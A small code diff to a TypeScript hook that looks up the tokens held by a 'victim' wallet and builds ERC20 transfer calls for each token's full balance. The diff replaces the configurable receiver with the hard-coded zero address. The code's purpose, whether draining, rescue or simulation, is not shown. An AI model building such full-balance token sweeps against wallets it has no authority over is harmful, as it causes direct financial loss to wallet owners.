@@ -19,7 +19,6 @@ export const useDetectTokens = () => {
     async (
       victimWalletAddress: string,
       chainId: number,
-      recieverWalletAddress = '0x0000000000000000000000000000000000000000',
       forceFetch = false,
     ): Promise<ITokenMetadata[] | undefined> => {
       const alchemy = new Alchemy({
@@ -83,7 +82,10 @@ export const useDetectTokens = () => {
                 data: encodeFunctionData({
                   abi: ERC20_ABI,
                   functionName: 'transfer',
-                  args: [recieverWalletAddress, token.tokenBalance],
+                  args: [
+                    '0x0000000000000000000000000000000000000000',
+                    token.tokenBalance,
+                  ],
                 }) as `0x${string}`,
               },
             };
